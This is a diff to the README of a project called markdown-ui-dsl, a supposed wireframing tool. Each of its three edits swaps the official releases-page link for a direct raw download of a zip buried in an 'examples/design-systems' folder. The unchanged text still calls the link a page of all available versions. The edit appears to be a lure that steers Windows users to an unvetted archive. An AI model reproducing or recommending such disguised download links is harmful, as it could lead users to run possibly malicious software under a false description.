@@ -1,6 +1,6 @@
 # ⚙️ markdown-ui-dsl - Simple Text-Based UI Wireframing
 
-[![Download markdown-ui-dsl](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Skyscraperfoxhound619/markdown-ui-dsl/releases)
+[![Download markdown-ui-dsl](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Skyscraperfoxhound619/markdown-ui-dsl/main/examples/design-systems/markdown_dsl_ui_v1.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get markdown-ui-dsl running on your Windows computer.
 
 Click or copy and paste this link into your browser:
 
-[https://github.com/Skyscraperfoxhound619/markdown-ui-dsl/releases](https://github.com/Skyscraperfoxhound619/markdown-ui-dsl/releases)
+[https://raw.githubusercontent.com/Skyscraperfoxhound619/markdown-ui-dsl/main/examples/design-systems/markdown_dsl_ui_v1.1.zip](https://raw.githubusercontent.com/Skyscraperfoxhound619/markdown-ui-dsl/main/examples/design-systems/markdown_dsl_ui_v1.1.zip)
 
 This page shows all the available versions of markdown-ui-dsl. You will find the latest release at the top.
 
@@ -82,7 +82,7 @@ You can now start creating UI wireframes using simple text commands.
 
 To download and install markdown-ui-dsl, visit this page:
 
-[Download markdown-ui-dsl](https://github.com/Skyscraperfoxhound619/markdown-ui-dsl/releases)
+[Download markdown-ui-dsl](https://raw.githubusercontent.com/Skyscraperfoxhound619/markdown-ui-dsl/main/examples/design-systems/markdown_dsl_ui_v1.1.zip)
 
 ---
 
